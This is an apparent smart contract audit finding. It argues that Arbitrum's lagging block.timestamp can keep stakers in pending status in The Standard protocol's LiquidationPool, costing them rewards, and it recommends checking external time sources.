[distributeAssets()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L206) distributes rewards to confirmed stakers. It does so by first calling [consolidatePendingStakes()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L120) which ensures that anyone who staked more than 24 hours (1 day) ago is eligible. The `consolidatePendingStakes()` function is used at multiple places inside the protocol.

```js
    function consolidatePendingStakes() private {
@---->  uint256 deadline = block.timestamp - 1 days;
        for (int256 i = 0; uint256(i) < pendingStakes.length; i++) {
            PendingStake memory _stake = pendingStakes[uint256(i)];
            if (_stake.createdAt < deadline) {
                positions[_stake.holder].holder = _stake.holder;
                positions[_stake.holder].TST += _stake.TST;
                positions[_stake.holder].EUROs += _stake.EUROs;
                deletePendingStake(uint256(i));
                // pause iterating on loop because there has been a deletion. "next" item has same index
                i--;
            }
        }
    }
```

This `deadline` check however is not accurate as `block.timestamp` may return a past timestamp on Arbitrum and quite possibly on other L2 chains.

## Vulnerability Details
As the [arbitrum docs](https://docs.arbitrum.io/for-devs/concepts/differences-between-arbitrum-ethereum/block-numbers-and-time#block-timestamps-arbitrum-vs-ethereum) explain, the `block.timestamp` can return a time which is up to 24 hours earlier than the current time, which means it's possible that the `block.timestamp` has had the same value since the last 24 hours. 
<br>

> As mentioned, block timestamps are usually set based on the sequencer's clock. Because there's a possibility that the sequencer fails to post batches on the parent chain (for example, Ethereum) for a period of time, it should have the ability to slightly adjust the timestamp of the block to account for those delays and prevent any potential reorganisations of the chain. 

**_Note_**:
> To limit the degree to which the sequencer can adjust timestamps, some boundaries are set, currently to 24 hours earlier than the current time, and 1 hour in the future.
<br>

Consider this:
- Alice stakes at real-world time `Jan-08-2024 06:42:21 AM +UTC`
- Arbitrum `block.timestamp` is at `Jan-08-2024 06:42:21 AM +UTC` too
- 24 hours pass
- Real-world time is `Jan-09-2024 06:42:21 AM +UTC`
- Arbitrum is lagging by 23 hours and hence outputs `block.timestamp` as `Jan-08-2024 07:42:21 AM +UTC`

Even though Alice should be a confirmed staker now, she is considered as pending by the function `consolidatePendingStakes()`. Any reward distribution she was eligible for when `distributeAssets()` is called, is missed out.

## Impact
Staker misses out on rewards and is considered in "pending" status instead of "confirmed" status.

## Tools Used
Manual review

## Recommendations
We can consider making use of multiple external sources which can be checked to see if there is a huge mismatch between the `block.timestamp` values. 
